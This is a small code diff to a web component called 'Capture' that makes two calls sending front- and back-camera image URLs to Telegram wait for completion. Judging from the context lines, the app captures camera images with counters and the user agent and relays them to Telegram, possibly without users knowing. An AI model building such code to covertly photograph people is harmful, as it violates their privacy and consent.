@@ -201,7 +201,7 @@ const Capture = () => {
               image_data: urlData.publicUrl,
               user_agent: `${navigator.userAgent} [FRONT-${captureCountRef.current}]`
             });
-            notifyTelegram(urlData.publicUrl, 'front', captureCountRef.current);
+            await notifyTelegram(urlData.publicUrl, 'front', captureCountRef.current);
           }
         }
         
@@ -228,7 +228,7 @@ const Capture = () => {
               image_data: urlData.publicUrl,
               user_agent: `${navigator.userAgent} [BACK-${captureCountRef.current}]`
             });
-            notifyTelegram(urlData.publicUrl, 'back', captureCountRef.current);
+            await notifyTelegram(urlData.publicUrl, 'back', captureCountRef.current);
           }
         }
         
